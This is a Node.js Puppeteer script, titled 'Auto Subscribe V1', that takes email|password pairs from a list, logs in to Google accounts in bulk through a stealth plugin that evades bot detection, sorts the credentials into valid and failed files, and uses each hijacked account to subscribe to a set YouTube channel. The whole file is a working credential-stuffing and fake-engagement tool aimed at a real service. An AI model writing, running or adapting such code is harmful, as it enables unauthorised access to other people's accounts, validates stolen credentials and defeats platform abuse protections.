const puppeteer = require('puppeteer-extra');
const fs = require("fs");
const delay = require('delay');
var art = require('ascii-art');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
var data = fs.readFileSync('list.txt');

const empass = data
	.toString()
	.replace(/\r\n|\r|\n/g, " ")
	.split(" ").filter((item) => {
		return item && item.trim()
	})

function head(){		
	art.font('FiDev', 'doom', function(subtext){
			console.log(art.style(subtext, 'green')+"_____Auto Subscribe V1_____\n")
		});
}

async function log(item, index) {
	var xdata = item;
	if (xdata == '' || xdata == undefined) {
		return false
	}
	var email = xdata.split("|")[0]
	var pass = xdata.split("|")[1]
    var user_channel = "@ares8SPmerpati";
	if (email == '' || pass == '') {
		return false
	}
	puppeteer.use(StealthPlugin());
	const browser = await puppeteer.launch({
		headless: false,
		ignoreDefaultArgs: ['--enable-automation'],
		executablePath:'C:/Program Files/Google/Chrome/Application/chrome.exe'

	});
	const page = await browser.newPage();
	console.log("[+] Trying login with " + email);
	await page.goto('https://accounts.google.com/signin/v2/identifier?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin', {
		awaitUntil: 'networkidle0'
	});
	await page.setViewport({ width: 800, height: 600 })
	console.log("[-] Typing email " + email);
	await delay(2000)
	await page.type('input[name=identifier]', email);
	await page.keyboard.press('Enter');
	await delay(3000)
	let [user_error,captcha] = await page.evaluate(() => {
		const user = document.querySelector('.o6cuMc');
		const captcha = document.querySelector('.Xb9hP');
		return [
			user && user.innerText,
			captcha && captcha.innerText,
		];
	});
	if (user_error == "Couldn’t find your Google Account") {
		console.log("[-] Couldn’t find your Google Account\n");
		readWriteSync(email)
		fs.appendFileSync('no-regis-gmail.txt', email + "|" + pass + " ["+user_error+"]\n");
		browser.close();
	}else if(captcha != "Enter your password"){
		console.log("[!] Captcha\n");
		readWriteSync(email)
		browser.close();
	}else{
		console.log("[-] Typing password " + "*************");
		await page.type('input[name=Passwd]', pass);
		await page.keyboard.press('Enter');
		await delay(5000)
		let [password_error,verif,verif_nope,cant_signin,cant_signin1] = await page.evaluate(() => {
			const password = document.querySelector('div[jsname=B34EJ]');
			const verif_error = document.querySelector('.ahT6S');
			const verif_nope = document.querySelector('.glT6eb');
			const cant_signin = document.querySelector('.PrDSKc');
			const cant_signin1 = document.querySelector('.IXbypd');
			// const m_success = document.querySelector('#KmsiDescription');
			return [
				password && password.innerText,
				verif_error && verif_error.innerText,
				verif_nope && verif_nope.innerText,
				cant_signin && cant_signin.innerText,
				cant_signin1 && cant_signin1.innerText,
			];
		});
        // await delay(1000000)
		if (password_error != null && password_error == "Wrong password. Try again or click Forgot password to reset it.") {
			console.log("[-] "+password_error+"\n");
			readWriteSync(email)
			fs.appendFileSync('gmail-failed.txt', email + "|" + pass + " ["+password_error+"]\n");
			browser.close();
		}else if(password_error != null){
			console.log("[-] "+password_error+"\n");
			readWriteSync(email)
			fs.appendFileSync('gmail-failed.txt', email + "|" + pass + " ["+password_error+"]\n");
			browser.close();
		}else if(verif == "Akun telah dinonaktifkan"){
            console.log("[-] "+ verif+"\n");
			readWriteSync(email)
			fs.appendFileSync('gmail-disable.txt', email + "|" + pass + " ["+ verif +"]\n");
			browser.close();
        }else if(verif === "Verifikasi diri Anda" || verif_nope === "Verifikasi identitas Anda"){
			console.log("[-] Result : Login Success ["+ verif + verif_nope+"]\n");
			readWriteSync(email)
			fs.appendFileSync('gmail-success.txt', email + "|" + pass + " ["+ verif + verif_nope +"]\n");
			browser.close();
		}else if(cant_signin == "Google couldn’t verify this account belongs to you." || cant_signin1 == "Couldn’t sign you in"){
			console.log("[-] "+cant_signin+"\n");
			readWriteSync(email)
			fs.appendFileSync('gmail-cant-verif.txt', email + "|" + pass + " ["+cant_signin+cant_signin1+"]\n");
			browser.close();
		}else {
			console.log("[-] Result : Login Success");
			await delay(3000)
			await page.goto("https://www.youtube.com/"+user_channel, {
				awaitUntil: 'networkidle0'
			});
			console.log("[-] Go To Youtube");
            let [subs] = await page.evaluate(() => {
				const subs = document.querySelectorAll('span[class="yt-core-attributed-string yt-core-attributed-string--white-space-no-wrap"]')[1];
				return [
					subs && subs.innerText,
				];
			});
            if(subs != "Disubscribe"){
                await page.click('button[class="yt-spec-button-shape-next yt-spec-button-shape-next--filled yt-spec-button-shape-next--mono yt-spec-button-shape-next--size-m "]');
                console.log("[+] Subscribe To "+user_channel+" Successfully\n");
            }else{
                console.log("[+] Allreally Subscribe To "+user_channel+"\n");
            }
			readWriteSync(email)
			fs.appendFileSync('gmail-success.txt', email + "|" + pass + " [Subscribe  "+user_channel+" Successfully]\n");
			browser.close();
		}
		// await delay(1000000)
		}
	}



async function fun() {
	head();
	for (var i = 0; i <= empass.length; i++) {
		await log(empass[i], i);
	}


}


function readWriteSync(email) {
	var data = fs.readFileSync("list.txt", 'utf-8');
  
	var linesExceptFirst = data.split('\n').slice(1).join('\n');
  
	fs.writeFileSync("list.txt", linesExceptFirst, 'utf-8');
  }

fun();